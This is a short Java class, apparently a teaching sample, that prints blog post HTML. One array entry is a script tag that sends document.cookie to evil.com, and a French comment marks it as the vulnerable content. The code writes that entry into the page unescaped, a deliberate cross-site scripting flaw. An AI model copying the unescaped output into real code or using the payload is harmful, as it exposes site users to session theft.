public class BlogPost {
    public static void main(String[] args) {
        String[] postContents = {
            "Ceci est un article normal",
            "<script>fetch('http://evil.com/steal?' + document.cookie)</script>",
            "Autre contenu sécurisé"
        };
        
        System.out.println("<div class='blog-posts'>");
        // Affichage du contenu vulnérable (index 1)
        System.out.println("<article>" + postContents[1] + "</article>");
        System.out.println("</div>");
    }
}